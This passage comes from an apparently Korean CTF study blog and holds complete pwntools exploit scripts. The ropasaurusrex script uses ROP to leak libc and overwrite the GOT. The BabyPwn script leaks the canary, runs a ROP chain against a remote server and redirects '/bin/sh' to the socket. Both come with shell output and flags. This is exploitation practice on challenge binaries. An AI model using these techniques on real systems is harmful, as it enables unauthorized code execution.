&#x2F;lib32&#x2F;libc.so.6 | grep __read</span><br><span class="line">(생략)</span><br><span class="line">   df11b:e8 00 65 00 00       call   e5620 &lt;__read@@GLIBC_2.0&gt;</span><br><span class="line">   df27a:e8 a1 63 00 00       call   e5620 &lt;__read@@GLIBC_2.0&gt;</span><br><span class="line">   df42e:e8 ed 61 00 00       call   e5620 &lt;__read@@GLIBC_2.0&gt;</span><br><span class="line">000e5620 &lt;__read@@GLIBC_2.0&gt;:</span><br><span class="line">   e5639:75 1d                jne    e5658 &lt;__read@@GLIBC_2.0+0x38&gt;</span><br><span class="line">   e564c:77 52                ja     e56a0 &lt;__read@@GLIBC_2.0+0x80&gt;</span><br><span class="line">   e5680:77 28                ja     e56aa &lt;__read@@GLIBC_2.0+0x8a&gt;</span><br><span class="line">(생략)</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ objdump -d &#x2F;lib32&#x2F;libc.so.6 | grep system</span><br><span class="line">0003ce10 &lt;__libc_system@@GLIBC_PRIVATE&gt;:</span><br><span class="line">   3ce24:74 0a                je     3ce30 &lt;__libc_system@@GLIBC_PRIVATE+0x20&gt;</span><br><span class="line">00127030 &lt;svcerr_systemerr@@GLIBC_2.0&gt;:</span><br><span class="line">  12708b:75 04                jne    127091 &lt;svcerr_systemerr@@GLIBC_2.0+0x61&gt;</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; read offset   : 0xe5620</span><br><span class="line">&#x2F;&#x2F; system offset : 0x3ce24</span><br></pre></td></tr></table></figure><p><strong>objdump를 이용해서 read/system offset을 구했습니다. read offset은 libc의 주소를 릭 하는데 사용되고, system offset은 나중에 system 주소를 릭할 때 사용됩니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">libc &#x3D; read_addr - read_offset</span><br><span class="line">system &#x3D; libc + system_offset</span><br></pre></td></tr></table></figure><p><strong>위와 같이 read addr에서 read offset을 빼주면 libc의 시작 주소가 나올 것이고, libc에서 system offset 만큼 더해주면 system 함수의 시작 주소가 나올 것 입니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ objdump -h ropasaurusrex </span><br><span class="line"></span><br><span class="line">ropasaurusrex:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line">(생략)</span><br><span class="line"> 24 .bss          00000008  08049628  08049628  00000628  2**2</span><br><span class="line">                  ALLOC</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>마지막으로 objdump를 이용해서 <code>/bin/sh</code>을 저장할 bss 영역의 주소를 알아냈습니다</strong><br></p><ul><li>시나리오<br></li></ul><ol><li>write 함수를 호출해서 read 주소를 릭한다. read 주소랑 read offset이랑 빼서 libc의 시작 주소를 구하고, libc의 시작 주소에 system offset을 더해서 system의 시작 주소를 구한다.<br></li><li>read 함수를 호출해서 bss 영역에 <code>&quot;/bin/sh&quot;</code>을 넣어준다.</li><li>read 함수를 호출해서 read got의 system addr을 넣어준다.</li><li>read 함수를 호출하면 (3)에서 read got가 system addr로 덮였기 때문에 system 함수가 호출이 되고, 인자값으로는 bss를 넘겨준다. bss에는 <code>&quot;/bin/sh&quot;</code>가 들어있다.<br></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./ropasaurusrex&quot;</span>)</span><br><span class="line"></span><br><span class="line">read_plt = <span class="number">0x0804832c</span></span><br><span class="line">read_got = <span class="number">0x0804961c</span></span><br><span class="line">read_off = <span class="number">0xe5620</span></span><br><span class="line">write_plt = <span class="number">0x0804830c</span></span><br><span class="line">write_got = <span class="number">0x08049614</span></span><br><span class="line">pppr = <span class="number">0x080484b6</span></span><br><span class="line">dynamic = <span class="number">0x08049530</span></span><br><span class="line">system_off = <span class="number">0x3ce10</span> </span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;A&quot;</span> * (<span class="number">136</span> + <span class="number">4</span>) <span class="comment"># buffer + sfp</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 시나리오 (1)</span></span><br><span class="line">payload += p32(write_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">1</span>)</span><br><span class="line">payload += p32(read_got)</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 시나리오 (2)</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(dynamic)</span><br><span class="line">payload += p32(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 시나리오 (3)</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(pppr)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line">payload += p32(read_got)</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 시나리오 (4)</span></span><br><span class="line">payload += p32(read_plt)</span><br><span class="line">payload += p32(<span class="number">0x41414141</span>)</span><br><span class="line">payload += p32(dynamic)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">readaddr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">libc_base = readaddr - read_off</span><br><span class="line">system = libc_base + system_off</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(system)</span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;/bin/sh&quot;</span>)</span><br><span class="line">p.send(p32(system))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Plaid CTF 2013$ python exploit.py </span><br><span class="line">[+] Starting local process &#39;.&#x2F;ropasaurusrex&#39;: pid 8695</span><br><span class="line">0xf7d6e000</span><br><span class="line">0xf7daae10</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ id</span><br><span class="line">uid&#x3D;1000(pocas) gid&#x3D;1000(pocas) groups&#x3D;1000(pocas),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),116(lpadmin),126(sambashare)</span><br><span class="line">$ cat key</span><br><span class="line">you_cant_stop_the_ropasaurusrex</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : you_cant_stop_the_ropasaurusrex</p></blockquote><hr><h2 id="PWN-D-3-2021-01-27"><a href="#PWN-D-3-2021-01-27" class="headerlink" title="PWN D+3 (2021.01.27)"></a>PWN D+3 (2021.01.27)<br></h2><hr><p>Codagate 2017 Challenge : BabyPwn</p><p><strong>이번에는 Canary Leak + ROP를 이용한 문제를 풀어보겠습니다. 방금 Canary에 대해 공부를 하고, Canary 릭을 해서 푸는 문제가 없나 보니 코게 문제로 하나가 있어 풀어보겠습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ checksec --file&#x3D;babypwn</span><br><span class="line">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATHSymbolsFORTIFYFortifiedFortifiableFILE</span><br><span class="line">Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   No Symbols  No01babypwn</span><br><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ </span><br></pre></td></tr></table></figure><p><strong>checksec을 이용해서 보호 기법을 확인해보니, 카나리와, NX Bit가 걸려있는 것을 확인할 수 있습니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> a1, <span class="keyword">char</span> **a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">socklen_t</span> addr_len; <span class="comment">// [esp+20h] [ebp-30h]</span></span><br><span class="line">  <span class="keyword">int</span> optval; <span class="comment">// [esp+24h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">int</span> v5; <span class="comment">// [esp+28h] [ebp-28h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">addr</span>;</span> <span class="comment">// [esp+2Ch] [ebp-24h]</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr</span> <span class="title">v7</span>;</span> <span class="comment">// [esp+3Ch] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v8; <span class="comment">// [esp+4Ch] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v8 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a1 == <span class="number">2</span> )</span><br><span class="line">    v5 = atoi(a2[<span class="number">1</span>]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    v5 = <span class="number">8181</span>;</span><br><span class="line">  dword_804B1BC = socket(<span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">if</span> ( dword_804B1BC == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[!] socket Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  addr.sa_family = <span class="number">2</span>;</span><br><span class="line">  *(_WORD *)addr.sa_data = htons(v5);</span><br><span class="line">  *(_DWORD *)&amp;addr.sa_data[<span class="number">2</span>] = <span class="number">0</span>;</span><br><span class="line">  bzero(&amp;addr.sa_data[<span class="number">6</span>], <span class="number">8u</span>);</span><br><span class="line">  optval = <span class="number">1</span>;</span><br><span class="line">  setsockopt(dword_804B1BC, <span class="number">1</span>, <span class="number">2</span>, &amp;optval, <span class="number">4u</span>);</span><br><span class="line">  <span class="keyword">if</span> ( bind(dword_804B1BC, &amp;addr, <span class="number">0x10</span>u) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[!] bind Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( listen(dword_804B1BC, <span class="number">1024</span>) == <span class="number">-1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[!] listen Error!&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      addr_len = <span class="number">16</span>;</span><br><span class="line">      fd = accept(dword_804B1BC, &amp;v7, &amp;addr_len);</span><br><span class="line">      <span class="keyword">if</span> ( fd != <span class="number">-1</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      perror(<span class="string">&quot;[!] accept Error!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !fork() )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    close(fd);</span><br><span class="line">    <span class="keyword">while</span> ( waitpid(<span class="number">-1</span>, <span class="number">0</span>, <span class="number">1</span>) &gt; <span class="number">0</span> )</span><br><span class="line">      ;</span><br><span class="line">  &#125;</span><br><span class="line">  sub_8048B87();</span><br><span class="line">  close(dword_804B1BC);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>IDA를 이용해 코드로 변환해주었습니다. main 함수를 보면 socket을 이용해서 8181 포트로 서버를 여는 것을 볼 수 있습니다. 2020년 1월쯤에 C 언어로 이용해서 소켓으로 서버 구축한 적이 있기 때문에 바로 알아 챌 수 있었습니다. 소켓을 생성하고 마지막에는 sub_8048B87 함수를 호출하는 것을 볼 수 있습니다.</strong><br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">sub_8048A71</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v1; <span class="comment">// [esp+1Ch] [ebp-3Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v2; <span class="comment">// [esp+24h] [ebp-34h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v3; <span class="comment">// [esp+4Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;v2, <span class="number">0</span>, <span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        sub_80488B1(<span class="string">&quot;\n===============================\n&quot;</span>);</span><br><span class="line">        sub_80488B1(<span class="string">&quot;1. Echo\n&quot;</span>);</span><br><span class="line">        sub_80488B1(<span class="string">&quot;2. Reverse Echo\n&quot;</span>);</span><br><span class="line">        sub_80488B1(<span class="string">&quot;3. Exit\n&quot;</span>);</span><br><span class="line">        sub_80488B1(<span class="string">&quot;===============================\n&quot;</span>);</span><br><span class="line">        v1 = sub_804895A();</span><br><span class="line">        <span class="keyword">if</span> ( v1 != <span class="number">1</span> )</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        sub_80488B1(<span class="string">&quot;Input Your Message : &quot;</span>);</span><br><span class="line">        sub_8048907(&amp;v2, <span class="number">100</span>);</span><br><span class="line">        sub_80488B1(&amp;v2);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( v1 != <span class="number">2</span> )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      sub_80488B1(<span class="string">&quot;Input Your Message : &quot;</span>);</span><br><span class="line">      sub_8048907(&amp;v2, <span class="number">100</span>);</span><br><span class="line">      sub_80489C8(&amp;v2);</span><br><span class="line">      sub_80488B1(&amp;v2);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( v1 == <span class="number">3</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    sub_80488B1(<span class="string">&quot;\n[!] Wrong Input\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>sub_8048A71 함수를 보면 v1, v2, v3 변수를 정의하는 것을 볼 수 있고, v3은 카나리입니다. 하지만 1번 메뉴와 2번 메뉴를 확인해보면 v2의 크기는 40인데 100만큼 입력 받기 때문에 BOF 취약점이 발생합니다. NX Bit가 걸려 있기 때문에 BOF 취약점을 이용해서 ROP를 해주면 될 거 같고, 카나리가 걸려 있기 때문에 카나리부터 릭을 해야합니다.</strong><br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&quot;127.0.0.1&quot;</span>, <span class="number">8181</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Canary Leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;a&quot;</span> * <span class="number">41</span>)</span><br><span class="line">canary = u32(<span class="string">&quot;\x00&quot;</span> + p.recv(<span class="number">1024</span>)[<span class="number">41</span>:<span class="number">44</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Canary : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(canary)))</span><br></pre></td></tr></table></figure><p><strong>Canary는 위와 같이 릭을 할 수 있습니다. v2의 값으로 <code>&quot;a&quot;</code>를 40개 주게 되면 v2 변수가 꽉차 v3 변수와 이어지게 됩니다. 하지만 v2를 꽉 채워주지 않으면 남은 메모리에 Null 값이 삽입되기 때문에 Canary를 릭할 수 없습니다. 하지만 40개를 다 채워줬는데 Canary가 출력 되지 않는데 이는 Canary에 시작도 Null로 시작하기 때문입니다. 그래서 <code>&quot;a&quot;</code>를 41개를 줘 Canary에 시작인 Null 값도 덮으면 Canary 전체를 릭할 수 있습니다.(Null 값이 존재하면 더 이상 읽지 않음)</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ objdump -h babypwn </span><br><span class="line"></span><br><span class="line">babypwn:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line"></span><br><span class="line">(생략)</span><br><span class="line"> 24 .bss          0000000c  0804b1b4  0804b1b4  000021b4  2**2</span><br><span class="line">                  ALLOC</span><br><span class="line">(생략)</span><br></pre></td></tr></table></figure><p><strong>objdump를 이용해 bss를 구했습니다.</strong><br></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ gdb -q .&#x2F;babypwn</span><br><span class="line">Reading symbols from .&#x2F;babypwn...(no debugging symbols found)...done.</span><br><span class="line">gdb-peda$ p system</span><br><span class="line">$1 &#x3D; &#123;&lt;text variable, no debug info&gt;&#125; 0x8048620 &lt;system@plt&gt;</span><br><span class="line">gdb-peda$ </span><br></pre></td></tr></table></figure><p><strong>그리고 해당 파일에 system 함수가 존재하기 때문에 libc를 따로 구하지 않아도 될 거 같습니다. 이제 Canary를 릭하고, system 함수가 존재하는 것을 알았기 때문에 ROP를 해보겠습니다.</strong><br></p><ul><li>시나리오<br></li></ul><ol><li>카나리를 릭한다 (Null 값 조심).</li><li>recv 함수를 이용해서 bss에 Command를 넣어준다. (bss에 값을 넣어줄 수 있는 함수가 recv 함수뿐이 없다)</li><li>system 함수의 인자로 bss를 넘겨준다. bss에는 <code>/bin/sh &lt;&amp;4 &gt;&amp;0</code>가 들어있다. <br></li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;141.164.52.207&quot;</span>, <span class="number">8181</span>)</span><br><span class="line">E = ELF(<span class="string">&quot;./babypwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Canary Leak</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendafter(<span class="string">&quot;: &quot;</span>, <span class="string">&quot;a&quot;</span> * <span class="number">41</span>)</span><br><span class="line">canary = u32(<span class="string">&quot;\x00&quot;</span> + p.recv(<span class="number">1024</span>)[<span class="number">41</span>:<span class="number">44</span>])</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">&quot;Canary : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(canary)))</span><br><span class="line"></span><br><span class="line">ppppr = <span class="number">0x8048eec</span></span><br><span class="line">bss = E.bss()</span><br><span class="line">system_plt = E.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">recv_plt = E.plt[<span class="string">&#x27;recv&#x27;</span>]</span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;/bin/sh &lt;&amp;4 &gt;&amp;0&quot;</span></span><br><span class="line">log.info(<span class="string">&quot;bss : &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(bss)))</span><br><span class="line"></span><br><span class="line">p.close()</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP Exploitation</span></span><br><span class="line">p = remote(<span class="string">&quot;141.164.52.207&quot;</span>, <span class="number">8181</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># ROP Channing</span></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span> * <span class="number">40</span></span><br><span class="line">payload += p32(canary)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span> * <span class="number">12</span> <span class="comment"># Dummy[8] + SFP[4]</span></span><br><span class="line"></span><br><span class="line">payload += p32(recv_plt)</span><br><span class="line">payload += p32(ppppr)</span><br><span class="line">payload += p32(<span class="number">4</span>)</span><br><span class="line">payload += p32(bss)</span><br><span class="line">payload += p32(<span class="built_in">len</span>(command)+<span class="number">1</span>)</span><br><span class="line">payload += p32(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">payload += p32(system_plt)</span><br><span class="line">payload += <span class="string">&quot;a&quot;</span> * <span class="number">4</span></span><br><span class="line">payload += p32(bss)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;: &quot;</span>, payload)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Exit -&gt; RET </span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(command)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pocas@pocas-VirtualBox:~&#x2F;pwn&#x2F;Codagate 2017$ python exploit.py </span><br><span class="line">[+] Opening connection to 141.164.52.207 on port 8181: Done</span><br><span class="line">[*] &#39;&#x2F;home&#x2F;pocas&#x2F;pwn&#x2F;Codagate 2017&#x2F;babypwn&#39;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">[*] Canary : 0x72c6c200</span><br><span class="line">[*] bss : 0x804b1b4</span><br><span class="line">[*] Closed connection to 141.164.52.207 port 8181</span><br><span class="line">[+] Opening connection to 141.164.52.207 on port 8181: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ cat flag</span><br><span class="line">FLAG&#123;GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^&#125;</span><br><span class="line">$  </span><br></pre></td></tr></table></figure><blockquote><p>FLAG : FLAG{GoodJob~!Y0u@re_Very__G@@d!!!!!!^.^}</p></blockquote><hr><h2 id="PWN-D-4-2021-01-28"><a href="#PWN-D-4-2021-01-28" class="headerlink" 